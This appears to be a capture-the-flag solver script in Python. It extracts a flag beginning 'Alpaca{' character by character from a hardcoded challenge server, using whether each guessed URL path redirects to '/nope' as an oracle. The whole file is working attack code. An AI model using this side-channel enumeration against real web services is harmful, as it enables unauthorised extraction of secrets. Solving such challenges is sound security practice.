import requests
import string
import time

BASE_URL = "http://34.170.146.252:14016/"

CHARS = string.ascii_letters + string.digits + "_" + "}"


current_flag = "Alpaca{"
path_parts = list(current_flag)
session = requests.Session()
while True:
    found_next_char = False
    for _ in range(40):
        for c in CHARS:
            test_parts = path_parts + [c]
            url = f"{BASE_URL}/" + "/".join(test_parts)
            time.sleep(0.1)
            resp = session.get(url, allow_redirects=False)
            if resp.status_code == 302:
                location = resp.headers.get("Location", "")
                if not location.endswith("/nope"):
                    path_parts.append(c)
                    current_flag += c
                    print(f"[+] Found char: {c} -> Current: {current_flag}")
                    found_next_char = True
                    break
            elif resp.status_code == 200 and "Alpaca{" in resp.text:
                print(f"\n[SUCCESS] Flag found: {resp.text}")
                exit(0)

        if found_next_char:
            break
    if not found_next_char:
        print("\n[-] Flag not found")
        break
